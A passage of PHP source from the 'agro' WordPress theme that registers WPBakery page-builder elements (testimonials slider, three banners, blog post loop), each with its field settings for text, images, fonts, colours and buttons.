                'heading' => esc_html__('Section Description', 'agro'),
            ),
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Testimonials Slider', 'agro'),
                'group' => esc_html__('Testimonials', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Review image', 'agro'),
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'name',
                        'heading' => esc_html__('Review name', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'job',
                        'heading' => esc_html__('Review position', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'quote',
                        'heading' => esc_html__('Quote text', 'agro'),
                    ),
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Review image width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Testimonials', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Review image height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Testimonials', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'slider_spacer',
                'heading' => esc_html__('Slider Options', 'agro'),
                'group' => esc_html__('Testimonials', 'agro'),
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'autoplay',
                'heading' => esc_html__('Auto play?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'group' => esc_html__('Testimonials', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'pauseonhover',
                'heading' => esc_html__('Pause on hover?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'group' => esc_html__('Testimonials', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'dots',
                'heading' => esc_html__('Dots?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'group' => esc_html__('Testimonials', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'speed',
                'heading' => esc_html__('Speed', 'agro'),
                'description' => esc_html__('Use simple number.default 1000 (1s).', 'agro'),
                'group' => esc_html__('Testimonials', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),

            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),

            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // colors
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Slide Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'quoteclr',
                'heading' => esc_html__('Quote text color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'iconclr',
                'heading' => esc_html__('Quote icon color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'authorclr',
                'heading' => esc_html__('Author color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'jobsclr',
                'heading' => esc_html__('Position color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr1',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'dotsclr',
                'heading' => esc_html__('Slider dots color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'dotsactclr',
                'heading' => esc_html__('Slider active dots color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}


/*******************************/
/* banner
/******************************/
if (!function_exists('agro_banner_integrateWithVC')) {
    add_action('vc_before_init', 'agro_banner_integrateWithVC');
    function agro_banner_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Banner 1', 'agro'),
        'base' => 'agro_banner',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usecontent',
                'heading' => esc_html__('Use custom content?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' )
            ),
            array(
                'type' => 'textarea_html',
                'param_name' => 'content',
                'heading' => esc_html__('Section Description or Custom Html Content', 'agro'),
                'dependency' => array(
                    'element' => 'usecontent',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Section Description', 'agro'),
                'dependency' => array(
                    'element' => 'usecontent',
                    'is_empty' => true
                )
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr0'
            ),
            array(
                'type' => 'vc_link',
                'param_name' => 'link',
                'heading' => esc_html__('Section Button', 'agro'),
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr1'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'price1',
                'heading' => esc_html__('Price 1', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'price2',
                'heading' => esc_html__('Price 2', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'weight',
                'heading' => esc_html__('Weight', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr2'
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'logo',
                'heading' => esc_html__('Logo Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Logo Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Logo Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'colorpicker',
                'param_name' => 'titleclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr3',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'prcbg',
                'heading' => esc_html__('Price background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'prcclr',
                'heading' => esc_html__('Price color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'btn_spacer',
                'heading' => esc_html__('Section Button Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button type', 'agro'),
                'param_name' => 'btntype',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Round', 'agro') => 'btn-round',
                    esc_html__('Square', 'agro') => 'btn-square',
                    esc_html__('Rounded', 'agro') => 'btn-rounded'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button style', 'agro'),
                'param_name' => 'btnstyle',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Outline to Solid', 'agro') => 'custom-btn--style-1',
                    esc_html__('Solid to Outline', 'agro') => 'custom-btn--style-4'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button size', 'agro'),
                'param_name' => 'btnsize',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Big', 'agro') => 'custom-btn--big',
                    esc_html__('Medium', 'agro') => 'custom-btn--medium',
                    esc_html__('Small', 'agro') => 'custom-btn--small'
                )
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbg',
                'heading' => esc_html__('Button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbg',
                'heading' => esc_html__('Hover button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr5',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnclr',
                'heading' => esc_html__('Button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrclr',
                'heading' => esc_html__('Hover button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr6',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbrd',
                'heading' => esc_html__('Button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbrd',
                'heading' => esc_html__('Hover button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* banner 2
/******************************/
if (!function_exists('agro_banner2_integrateWithVC')) {
    add_action('vc_before_init', 'agro_banner2_integrateWithVC');
    function agro_banner2_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Simple Banner 2', 'agro'),
        'base' => 'agro_banner2',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(

            array(
                'type' => 'attach_image',
                'param_name' => 'img1',
                'heading' => esc_html__('Left Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw1',
                'heading' => esc_html__('Left Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh1',
                'heading' => esc_html__('Left Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'vc_link',
                'param_name' => 'link1',
                'heading' => esc_html__('Left Image Link', 'agro'),
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'img2',
                'heading' => esc_html__('Right Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw2',
                'heading' => esc_html__('Right Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh2',
                'heading' => esc_html__('Right Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'vc_link',
                'param_name' => 'link2',
                'heading' => esc_html__('Right Image Link', 'agro'),
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'logo',
                'heading' => esc_html__('Logo', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lgimgw',
                'heading' => esc_html__('Logo Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lgimgh',
                'heading' => esc_html__('Logo Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* banner 3
/******************************/
if (!function_exists('agro_banner3_integrateWithVC')) {
    add_action('vc_before_init', 'agro_banner3_integrateWithVC');
    function agro_banner3_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Simple Banner 3', 'agro'),
        'base' => 'agro_banner3',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section Title', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro')
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'img',
                'heading' => esc_html__('Banner Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Banner Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Banner Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background Image', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}


/*******************************/
/* Blog Post Loop
/******************************/
if (!function_exists('agro_blog_integrateWithVC')) {
    add_action('vc_before_init', 'agro_blog_integrateWithVC');
    function agro_blog_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Blog Post Loop', 'agro'),
        'base' => 'agro_blog',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Post Style', 'agro'),
                'param_name' => 'style',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Style 1', 'agro') => '1',
                    esc_html__('Style 2', 'agro') => '2',
                )
            ),
            array(
                "type" => "loop",
                "heading" => esc_html__("Post Query", 'agro'),
                "param_name" => "build_query",
                'settings' => array(
                'size' => array( 'hidden' => false, 'value' =>  '' ),
                'order_by' => array( 'value' => 'date' ),
                'post_type' => array( 'value' => 'post', 'hidden' => false)
                ),
                "description" 	=> esc_html__("Create WordPress loop, to populate products from your site.", 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Section Description', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'pag',
                'heading' => esc_html__('Pagination?', 'agro'),
                'value' => array( esc_html__('Show', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the page pagination will be enabled.', 'agro'),
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'spt',
                'heading' => esc_html__('Section Top Spacing?', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the section padding-top will be disabled.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'spb',
                'heading' => esc_html__('Section Bottom Spacing?', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the section padding-bottom will be disabled.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            // Post thumb
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Post Image Width', 'agro'),
                'description' => esc_html__('Change post thumbnail image width or leave it blank.Note: use simple number without px or unit.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Post Image Height', 'agro'),
                'description' => esc_html__('Change post thumbnail image height or leave it blank.Note: use simple number without px or unit.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'fullthumb',
                'heading' => esc_html__('Full Image Size', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the post thumbnail image will be not cropped.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // Post title
            array(
                'type' => 'checkbox',
                'param_name' => 'hidetitle',
                'heading' => esc_html__('Hide Post Title', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the post title will be disabled.', 'agro'),
                'group' => esc_html__('Post Content', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15'
            ),
            // post cat
            array(
                'type' => 'checkbox',
                'param_name' => 'hidecat',
                'heading' => esc_html__('Hide Category', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the post category will be disabled.', 'agro'),
                'group' => esc_html__('Post Content', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // post date
            array(
                'type' => 'checkbox',
                'param_name' => 'hidedate',
                'heading' => esc_html__('Hide Date', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the post date will be disabled.', 'agro'),
                'group' => esc_html__('Post Content', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            //post content
            array(
                'type' => 'checkbox',
                'param_name' => 'hidetext',
                'heading' => esc_html__('Hide Content Text', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the post content text will be disabled.', 'agro'),
                'group' => esc_html__('Post Content', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'excerptsz',
                'heading' => esc_html__('Excerpt Limit', 'agro'),
                'description' => esc_html__('You can control with limit the content text.Use simple number.e.g:25', 'agro'),
                'group' => esc_html__('Post Content', 'agro'),
                'dependency' => array(
                    'element' => 'hidetext',
                    'is_empty' => true
                ),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'readmore',
                'heading' => esc_html__('Read More Button Title', 'agro'),
                'group' => esc_html__('Post Content', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
